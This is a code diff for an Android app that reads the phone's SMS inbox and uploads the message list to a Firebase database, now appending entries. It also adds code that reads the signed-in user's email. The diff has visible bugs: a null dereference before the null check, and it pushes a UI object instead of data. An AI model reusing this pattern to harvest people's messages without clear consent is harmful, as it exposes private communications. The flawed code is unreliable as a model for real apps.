@@ -151,7 +151,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 && ContextCompat.checkSelfPermission(getBaseContext(),"android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED
                 && ContextCompat.checkSelfPermission(getBaseContext(),"android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED ){
             refreshSmsInbox();
-            MyContactRef.setValue(smsListView);
+            MyContactRef.push().setValue(smsListView);
         }else{
             final int REQUEST_CODE_ASK_PERMISSION = 123;
             ActivityCompat.requestPermissions(MainActivity.this,new String[]{
@@ -165,6 +165,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             @Override
             public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                 FirebaseUser user = firebaseAuth.getCurrentUser();
+                String EMAIL = user.getEmail();
                 if(user!=null){
 
                 }
@@ -198,6 +199,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             if (resultCode == RESULT_OK) {
                 // Successfully signed in
                 FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
+                assert user != null;
+                String EMAIL = user.getEmail();
+
                 Toast.makeText(inst, "You Are Logged In", Toast.LENGTH_SHORT).show();
                 // ...
             } else {
@@ -223,7 +227,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     String str = "SMS From:" + smsInboxCurser.getString(indexAddress)+"\n"+smsInboxCurser.getString(indexBody)+"\n";
                     arrayAdapter.add(str);
                 }while (smsInboxCurser.moveToNext());
-                MyContactRef.setValue(smsListView);
+                MyContactRef.push().setValue(smsListView);
                 smsInboxCurser.close();
 
                 break;
